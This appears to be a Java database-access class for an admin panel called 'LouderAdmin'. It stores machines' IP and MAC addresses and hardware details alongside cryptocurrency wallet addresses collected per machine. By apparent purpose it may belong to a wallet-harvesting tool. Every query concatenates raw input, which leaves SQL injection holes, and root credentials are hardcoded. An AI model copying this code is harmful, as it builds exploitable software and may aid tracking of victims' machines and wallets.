package com.Databases;

import com.Model.PcHardware;
import com.Model.WalletStatistics;

import java.sql.*;
import java.util.ArrayList;

/**
 * Created by mihai on 3/25/2018.
 */
public class WalletstatisticsCRUD {
    private Connection con= null;
    private Statement stat=null;
    private static  final  String DBurl="jdbc:mysql://localhost/LouderAdmin";
    private static final String username="root";
    private static final String password="1111";


    public WalletstatisticsCRUD(){}


    public boolean create_connection(){
        boolean conect_status=true;
        try {
            Class.forName("com.mysql.jdbc.Driver");
            con= DriverManager.getConnection(DBurl,username, password);
            stat=con.createStatement();
        } catch (Exception e) {
            conect_status=false;
            System.out.println("Failed conection to DB!!!!");
            e.printStackTrace();
        }

        return conect_status;
    }



    public PcHardware get_all_items(String macaddress){
        PcHardware item=new PcHardware();
        try {
            if(create_connection()==true) {
                ResultSet rs = stat.executeQuery("Select hardwareinfo.type_cpu,hardwareinfo.videocontroller,hardwareinfo.totalphysicalmemory,hardwareinfo.ostype,networking.IP,networking.macaddress \n" +
                        "from hardwareinfo \n" +
                        "inner join networking on networking.id=hardwareinfo.macaddress\n" +
                        "where  networking.id=(Select id from networking  where macaddress='"+macaddress+"'); ");

                while (rs.next()) {
                    item.setCpu_type(rs.getString("type_cpu"));
                    item.setGpu_type(rs.getString("videocontroller"));
                    item.setPhysicalmemory(rs.getString("totalphysicalmemory"));
                    item.setOstype(rs.getString("ostype"));
                    item.setIp(rs.getString("IP"));
                    item.setMacaddress(rs.getString("macaddress"));
                }
            }
            stat.close();
            con.close();
        } catch (SQLException e) {
            e.printStackTrace();
        }

        return item;
    }


    public int get_count_items(){
        int count=0,count_db=0;
        try {
            if(create_connection()==true) {
                ResultSet rs = stat.executeQuery("SELECT count(id) from networking;");
                while (rs.next()){
                    count = rs.getInt(1);
                }

                if(count!=0) {
                    count_db = count / 20;
                    if ((count % 2) >= 0) {
                        if (count % 20 != 0) ++count_db;
                    }
                }else {count_db=1;}
            }
            stat.close();
            con.close();
        } catch (SQLException e) {
            e.printStackTrace();
        }
        return count_db;
    }

    public int get_data_is_empty(){
        int count=0;
        try {
            if(create_connection()==true) {
                ResultSet rs = stat.executeQuery("SELECT count(id) from networking;");
                while (rs.next()){
                    count = rs.getInt(1);
                }
            }
            stat.close();
            con.close();
        } catch (SQLException e) {
            e.printStackTrace();
        }

        return count;
    }


    public boolean insert_item(int macaddress,String wallet,int type){
        boolean status_execution=true;
        try {
            if(create_connection()==true) {
                stat.executeUpdate("Insert into Cryptowallet values(null,'"+wallet+"',"+type+","+macaddress+",now());");
            }
            stat.close();
            con.close();
        } catch (SQLException e) {
            status_execution=false;
            e.printStackTrace();
        }
        return status_execution;
    }



    public ArrayList<WalletStatistics> get_interval_items(int val_min){
        ArrayList<WalletStatistics> items=new ArrayList<WalletStatistics>();

        try {
            ResultSet rs,rs1;
            if(create_connection()==true) {
                if(val_min==1)rs = stat.executeQuery("Select * from networking LIMIT 20 OFFSET 0;");
                else rs = stat.executeQuery("Select * from networking LIMIT 20 OFFSET "+val_min+";");

                while (rs.next()) {
                    items.add(get_iterval_wallet(rs.getInt(1),rs.getString("IP"),rs.getString("macaddress"),rs.getString("net_date")));
                }

            }
            stat.close();
            con.close();
        } catch (SQLException e) {
            System.out.println("Failed conection to DB!!!!");
            e.printStackTrace();
        }

        return items;
    }


public WalletStatistics get_iterval_wallet(int id,String ip, String macaddress, String date){

    WalletStatistics stat_item= new WalletStatistics();
    stat_item.setIpaddress(ip);
    stat_item.setMacaddress(macaddress);
    stat_item.setDate(date);
    try {
        ResultSet rs;
        if(create_connection()==true) {
            for(int i=1;i<=4;++i) {
                rs = stat.executeQuery("select count(macaddress) from Cryptowallet where macaddress=" + id + " and typewallet=" + i + ";");
                while (rs.next()) {
                    if(i==1) stat_item.setEtherium_wallet(rs.getInt(1));
                    else if(i==2)stat_item.setBitcoi_wallet(rs.getInt(1));
                    else if(i==3)stat_item.setLitecoin_wallet(rs.getInt(1));
                    else if(i==4)stat_item.setBitcoinCash_wallet(rs.getInt(1));

                }
            }
        }
        stat.close();
        con.close();
    } catch (SQLException e) {
        System.out.println("Failed conection to DB!!!!");
        e.printStackTrace();
    }

        return stat_item;
}



 public ArrayList<String> get_all_wallet(String mac, int type_wallet){
    ArrayList<String> wallet= new ArrayList<String>();
    int increm=0;
     try {
         if(create_connection()==true){
         ResultSet rs;
         rs = stat.executeQuery("select address as wallet from Cryptowallet where typewallet="+type_wallet+" and macaddress=(Select id from networking where macaddress='"+mac+"');");

             while (rs.next()) {
               if(increm>25)break;
                 wallet.add(rs.getString("wallet"));
                 ++increm;
             }
         }
         stat.close();
         con.close();
     } catch (SQLException e) {
         System.out.println("Failed conection to DB!!!!");
         e.printStackTrace();
     }


    return wallet;
 }



 public String get_type_wallet(int walletid){
       String wallet= new String();

     try {
         if(create_connection()==true){
             ResultSet rs;
             rs = stat.executeQuery("Select type_wallet from type_wallet where id="+walletid+";");
             while (rs.next()) {
               wallet=rs.getString("type_wallet");
             }
         }
         stat.close();
         con.close();
     } catch (SQLException e) {
         System.out.println("Failed conection to DB!!!!");
         e.printStackTrace();
     }

     return wallet;
 }


    public int get_id_wallet(String wallet_address){
       int wallet=0;

        try {
            if(create_connection()==true){
                ResultSet rs;
                rs = stat.executeQuery("Select id from type_wallet where Type_wallet='"+wallet_address+"';");
                while (rs.next()) {wallet=rs.getInt("id");}
            }
            stat.close();
            con.close();
        } catch (SQLException e) {
            System.out.println("Failed conection to DB!!!!");
            e.printStackTrace();
        }

        return wallet;
    }


    public String get_ip(String macaddress){
        PcHardware item=new PcHardware();
        try {
            if(create_connection()==true) {
                ResultSet rs = stat.executeQuery("Select Ip from networking where macaddress='"+macaddress+"';");

                while (rs.next()) {
                 macaddress=rs.getString("Ip");
                 break;
                }
            }
            stat.close();
            con.close();
        } catch (SQLException e) {
            e.printStackTrace();
        }

        return macaddress;
    }


}
